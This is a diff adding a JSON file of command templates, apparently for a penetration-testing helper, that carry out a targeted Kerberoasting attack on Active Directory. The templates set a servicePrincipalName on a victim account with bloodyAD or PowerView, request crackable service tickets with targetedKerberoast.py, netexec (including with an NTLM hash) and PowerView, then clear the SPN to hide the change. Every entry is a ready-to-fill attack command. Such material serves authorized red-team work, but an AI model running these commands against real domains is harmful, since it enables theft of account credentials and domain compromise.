@@ -1,0 +1,39 @@
+{
+  "commands": [
+    {
+      "title": "Run targetedKerberoast.py",
+      "description": "Run targetedKerberoast.py script with verbose mode.",
+      "template": "targetedKerberoast.py -v -d \"{domain_controller}\" -u '{username}' -p '{password}'"
+    },
+    {
+      "title": "Add SPN to Targeted Account (bloodyAD)",
+      "description": "Add a servicePrincipalName to the target account using bloodyAD. This will allow ticket retrieval for kerberoasting.",
+      "template": "bloodyAD -d \"{domain}\" --host \"{domain_controller}\" -u '{username}' -p '{password}' set object \"{target_object}\" servicePrincipalName -v 'http/anything'"
+    },
+    {
+      "title": "Perform Kerberoasting with netexec ldap (nxc)",
+      "description": "Run kerberoasting with netexec ldap using NTLM hash to obtain service tickets.",
+      "template": "nxc ldap \"{domain_controller}\" -d \"{domain}\" -u '{username}' -H \"{ntlm_hash}\" --kerberoasting kerberoastables.txt"
+    },
+    {
+      "title": "PowerView: Get servicePrincipalName of a user",
+      "description": "Get the servicePrincipalName attribute of the victim user.",
+      "template": "Get-DomainUser '{target_object}' | Select serviceprincipalname"
+    },
+    {
+      "title": "PowerView: Set SPN of a user",
+      "description": "Set the servicePrincipalName attribute of the victim user.",
+      "template": "Set-DomainObject -Identity '{target_object}' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}"
+    },
+    {
+      "title": "PowerView: Obtain kerberoast ticket",
+      "description": "Obtain a kerberoast ticket for the user.",
+      "template": "$User = Get-DomainUser '{target_object}'\n$User | Get-DomainSPNTicket | fl"
+    },
+    {
+      "title": "PowerView: Clear SPNs of target user",
+      "description": "Clear the servicePrincipalName attribute of the target user.",
+      "template": "Set-DomainObject -Identity '{target_object}' -Clear serviceprincipalname"
+    }
+  ]
+}
